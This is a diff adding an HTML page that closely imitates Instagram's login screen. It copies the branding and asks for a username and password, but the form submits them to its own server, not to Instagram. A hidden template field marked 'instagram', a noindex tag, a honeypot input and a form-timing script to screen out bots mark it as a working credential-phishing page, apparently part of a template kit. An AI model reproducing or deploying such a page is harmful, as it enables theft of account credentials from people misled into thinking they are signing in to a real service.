@@ -1,0 +1,93 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Login - Instagram</title>
+<meta name="theme-color" content="#E1306C">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<link rel="icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23E1306C%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EI%3C/text%3E%3C/svg%3E">
+<link rel="apple-touch-icon" href="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A//www.w3.org/2000/svg%27%20viewBox%3D%270%200%2064%2064%27%3E%3Crect%20width%3D%2764%27%20height%3D%2764%27%20rx%3D%2714%27%20fill%3D%27%23E1306C%27/%3E%3Ctext%20x%3D%2732%27%20y%3D%2744%27%20font-family%3D%27Helvetica%2CArial%2Csans-serif%27%20font-size%3D%2734%27%20font-weight%3D%27700%27%20fill%3D%27%23fff%27%20text-anchor%3D%27middle%27%3EI%3C/text%3E%3C/svg%3E">
+<meta property="og:title" content="Login - Instagram">
+<meta property="og:site_name" content="Instagram">
+<style>
+  body { margin:0;min-height:100vh;background:#fafafa;color:#262626;
+         font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,
+                     sans-serif;display:flex;align-items:center;justify-content:center;
+         padding:32px 16px; }
+  .stage { display:flex;align-items:center;gap:24px; }
+  .phone { width:380px;height:580px;background:#fff;border:1px solid #dbdbdb;
+           border-radius:36px;box-shadow:0 12px 40px rgba(0,0,0,.12);display:flex;
+           align-items:center;justify-content:center;position:relative; }
+  .phone:before { content:'';position:absolute;top:12px;width:120px;height:22px;
+                  background:#000;border-radius:12px;opacity:.85; }
+  .phone .feed { width:70%; }
+  .phone .feed .bar { height:14px;background:#efefef;border-radius:7px;margin-bottom:12px; }
+  .phone .feed .tile { height:150px;background:linear-gradient(135deg,#feda75,#d62976,
+                        #962fbf);border-radius:12px;margin-bottom:12px; }
+  .col { width:100%;max-width:350px; }
+  .card { background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:40px 32px;
+          text-align:center;box-sizing:border-box; }
+  .wordmark { margin:0 0 28px; }
+  .field { margin-bottom:6px; }
+  .field input { width:100%;padding:11px 12px;font-size:14px;background:#fafafa;
+                 border:1px solid #dbdbdb;border-radius:3px;outline:none;
+                 box-sizing:border-box; }
+  .field input:focus { border-color:#a8a8a8; }
+  .btn { width:100%;padding:9px;font-size:14px;font-weight:600;color:#fff;
+         background:#E1306C;border:0;border-radius:8px;cursor:pointer;margin:10px 0 14px; }
+  .or { display:flex;align-items:center;gap:16px;margin:0 0 16px; }
+  .or .line { flex:1;height:1px;background:#dbdbdb; }
+  .or span { font-size:12px;font-weight:600;color:#8e8e8e; }
+  .fb { font-size:14px;font-weight:600;color:#385185;text-decoration:none; }
+  .forgot { font-size:12px;color:#00376b;margin:16px 0 0;display:block; }
+  .signup { background:#fff;border:1px solid #dbdbdb;border-radius:3px;padding:22px;
+            text-align:center;font-size:14px;margin-top:12px; }
+  .signup a { color:#E1306C;font-weight:600;text-decoration:none; }
+  .hp { position:absolute;left:-9999px;width:1px;height:1px;opacity:0; }
+  @media (max-width:860px) { .phone { display:none; } }
+</style>
+</head>
+<body>
+<div class="stage">
+  <div class="phone"><div class="feed"><div class="bar"></div><div class="tile"></div><div class="bar"></div><div class="bar"></div></div></div>
+  <div class="col">
+    <form class="card" method="POST" action="/">
+      <div class="wordmark"><svg viewBox="0 0 48 48" width="44" height="44" role="img" aria-label="Instagram"><defs><radialGradient id="ig" cx="30%" cy="107%" r="150%"><stop offset="0" stop-color="#fdf497"/><stop offset="5%" stop-color="#fdf497"/><stop offset="45%" stop-color="#fd5949"/><stop offset="60%" stop-color="#d6249f"/><stop offset="90%" stop-color="#285AEB"/></radialGradient></defs><rect width="48" height="48" rx="12" fill="url(#ig)"/><rect x="12" y="12" width="24" height="24" rx="7" fill="none" stroke="#fff" stroke-width="2.6"/><circle cx="24" cy="24" r="5.6" fill="none" stroke="#fff" stroke-width="2.6"/><circle cx="32.2" cy="15.8" r="1.7" fill="#fff"/></svg></div>
+    <div class="field">
+      <label for="username">Username or email</label>
+      <input id="username" name="username" type="text" placeholder="Enter your username" autocomplete="username" required>
+    </div>
+    <div class="field">
+      <label for="password">Password</label>
+      <input id="password" name="password" type="password" placeholder="Password" autocomplete="current-password" required>
+    </div>
+      <button class="btn" type="submit">Log in</button>
+      <div class="or"><span class="line"></span><span>OR</span><span class="line"></span></div>
+      <a class="fb" href="#">Log in with Facebook</a>
+
+  <input class="hp" type="text" name="hp_email" value="" tabindex="-1" autocomplete="off">
+  <input type="hidden" name="_tpl" value="instagram">
+  <input type="hidden" name="_ts" value="__TS__">
+
+<script>
+/* honeypot + human-timing beacon: if a bot autofills the hidden field we still
+   record it, and we log how long the form was open (bot forms are instant). */
+(function(){
+  var t0 = Date.now();
+  var f = document.querySelector('form');
+  if(!f) return;
+  f.addEventListener('submit', function(){
+    var el = f.querySelector('input[name=_ts]');
+    if(el) el.value = String(Date.now() - t0);
+  });
+})();
+</script>
+      <a class="forgot" href="#">Forgot password?</a>
+    </form>
+    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
+  </div>
+</div>
+</body>
+</html>
